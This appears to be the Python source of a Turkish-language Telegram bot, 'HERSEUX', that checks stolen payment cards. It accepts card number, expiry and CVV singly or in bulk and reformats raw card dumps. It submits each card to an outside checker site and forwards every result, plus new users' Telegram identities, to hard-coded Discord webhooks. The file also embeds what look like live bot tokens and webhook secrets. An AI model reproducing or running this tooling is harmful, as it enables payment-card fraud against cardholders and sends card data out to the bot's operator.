import requests import re import os from io import StringIO from telebot import TeleBot, types from datetime import datetime import threading

API_URL = "https://nagi.tr/checker/fetchproxy.php" BOT_TOKEN = "7850085187:AAF8jX4AVb8rcaARtPAAXcjtCFvNEPU4Dhg" WEBHOOK_LIVE = "https://discord.com/api/webhooks/1362353337013506129/bcAAKfveNmZfEQm6KSEXe0_ToWeU_A_hG_jp8kfq7Ga5uBKWQJ8CmBsxFJpmQmMEAItS" WEBHOOK_DECLINED = "https://discord.com/api/webhooks/1362353376909590599/VBJOl1N3f6H69UudhjXwPyuRZlRbCgF0suIY7M2shVCtgT-Pc3AI7BhTrJH07cE4KX87" WEBHOOK_UNKNOWN = "https://discord.com/api/webhooks/1362353440931708979/4vwk-95JiHHDnojOCIxZ3fx2lE6wevQhgvd-IXV5hVg79Muqn6MEbA6L5YlGkYhDfSFJ" WEBHOOK_LOG = "https://discord.com/api/webhooks/1362552619645665566/2z_Qdze2mQ3TsvgxEgg6YR3jWNX0yEsOMW1u4JRIBq0r38ZVvR7julwfgkuOKzaBVKQs"

OWNER_ID = 6369595142 banned_users = set()

bot = TeleBot(BOT_TOKEN)

def clean_result(text): return re.sub(r'(https?://\S+|www.\S+)', '', text).strip()

def send_to_webhook(content, webhook_url): try: requests.post(webhook_url, json={"content": content}) except: pass

def check_card(card): try: headers = { "accept": "/", "content-type": "application/x-www-form-urlencoded", "origin": "https://nagi.tr", "referer": "https://nagi.tr/checker/", "user-agent": "Mozilla/5.0" } cookies = {"ISCHECKURLRISK": "false"} data = f"card={card}"

res = requests.post(API_URL, headers=headers, cookies=cookies, data=data, timeout=10)
    html = res.text.strip()

    if 'alert alert-danger' in html:
        match = re.search(r'<div class=\"alert alert-danger.*?\">(.*?)<\/div>', html, re.DOTALL)
        hata = match.group(1).strip() if match else "Bilinmeyen hata"
        sonuc = f"{card} → ❌ Declined : {hata}"
        send_to_webhook(sonuc, WEBHOOK_DECLINED)
        return sonuc

    if "<!DOCTYPE html>" not in html:
        clean = clean_result(html)
        if "✅" in clean:
            send_to_webhook(clean, WEBHOOK_LIVE)
        elif "❌" in clean:
            send_to_webhook(clean, WEBHOOK_DECLINED)
        else:
            send_to_webhook(clean, WEBHOOK_UNKNOWN)
        return clean
    else:
        raise ValueError("HTML geldi, muhtemelen yanlış sonuç yapısı")

except Exception as e:
    hata = f"{card} → ❌ API HATASI: {str(e)}"
    send_to_webhook(hata, WEBHOOK_UNKNOWN)
    return hata

@bot.message_handler(commands=['start']) def start_cmd(message): if message.from_user.id in banned_users: return username = message.from_user.username or message.from_user.first_name or 'kullanıcı' user_id = message.from_user.id full_name = message.from_user.first_name + (" " + message.from_user.last_name if message.from_user.last_name else "") log_msg = f"👤 Yeni kullanıcı: @{username} | {full_name} | ID: {user_id}" send_to_webhook(log_msg, WEBHOOK_LOG) hosgeldin = f"👋 <b>Hoş geldin! @{username}</b> - <b>HERSEUX</b>\n\n🔹 <b>/check</b> — Tek kart kontrol et\n🔹 <b>/topluchk</b> — .txt ile toplu kart kontrol et\n🔹 <b>/parser</b> — Kartları otomatik biçimlendir ve kontrol et" bot.reply_to(message, hosgeldin, parse_mode='HTML')

@bot.message_handler(commands=['check']) def tek_check(message): if message.from_user.id in banned_users: return msg = bot.send_message(message.chat.id, "Kontrol edilecek kartı gir (no|ay|yıl|cvv)") bot.register_next_step_handler(msg, tek_check_cevap)

def tek_check_cevap(msg): card = msg.text.strip() sonuc = check_card(card) bot.reply_to(msg, sonuc)

@bot.message_handler(commands=['topluchk']) def toplu_check(message): if message.from_user.id in banned_users: return msg = bot.send_message(message.chat.id, ".txt dosyası gönder (max 30 kart)") bot.register_next_step_handler(msg, toplu_check_cevap)

def toplu_check_cevap(msg): if not msg.document: return bot.send_message(msg.chat.id, "❌ Geçerli .txt dosyası değil.") file = bot.download_file(bot.get_file(msg.document.file_id).file_path) cards = StringIO(file.decode("utf-8", errors="ignore")).readlines() if len(cards) > 30: return bot.send_message(msg.chat.id, f"Napiyon ({len(cards)}) ne nasıl yapayım!") yanitlar = [check_card(c.strip()) for c in cards if c.strip()] cevap = "\n".join(yanitlar) if len(cevap) < 4000: bot.send_message(msg.chat.id, cevap) else: with open("sonuclar.txt", "w", encoding="utf-8") as f: f.write(cevap) with open("sonuclar.txt", "rb") as f: bot.send_document(msg.chat.id, f)

@bot.message_handler(commands=['parser']) def parser_handler(message): if message.from_user.id in banned_users: return msg = bot.send_message(message.chat.id, "Ham kart içeren .txt dosyası gönder (max 30 satır)") bot.register_next_step_handler(msg, parser_cevap)

def parser_cevap(msg): if not msg.document: return bot.send_message(msg.chat.id, "❌ Geçerli .txt dosyası değil.") file = bot.download_file(bot.get_file(msg.document.file_id).file_path) lines = StringIO(file.decode("utf-8", errors="ignore")).readlines() if len(lines) > 30: return bot.send_message(msg.chat.id, f"Napiyon ({len(lines)}) ne nasıl yapayım!") parsed = [] for line in lines: parts = re.findall(r'\d{12,19}|\d{2}', line) if len(parts) >= 4: parsed.append(f"{parts[0]}|{parts[1]}|20{parts[2]}|{parts[3]}") if not parsed: return bot.send_message(msg.chat.id, "⚠️ Biçimlendirilebilecek kart bulunamadı.") yanitlar = [check_card(p) for p in parsed] cevap = "\n".join(yanitlar) if len(cevap) < 4000: bot.send_message(msg.chat.id, cevap) else: with open("parser_sonuclar.txt", "w", encoding="utf-8") as f: f.write(cevap) with open("parser_sonuclar.txt", "rb") as f: bot.send_document(msg.chat.id, f)

@bot.message_handler(commands=['ban']) def ban_user(message): if message.from_user.id != OWNER_ID: return try: user_id = int(message.text.split()[1]) banned_users.add(user_id) bot.reply_to(message, f"🚫 Kullanıcı {user_id} banlandı.") except: bot.reply_to(message, "❌ Kullanıcı ID'si geçerli değil.")

@bot.message_handler(commands=['unban']) def unban_user(message): if message.from_user.id != OWNER_ID: return try: user_id = int(message.text.split()[1]) banned_users.discard(user_id) bot.reply_to(message, f"✅ Kullanıcı {user_id} unbanlandı.") except: bot.reply_to(message, "❌ Kullanıcı ID'si geçerli değil.")

if name == "main": print("✅ Bot başlatılıyor... Sadece bir örneği çalıştırın!") bot.infinity_polling()

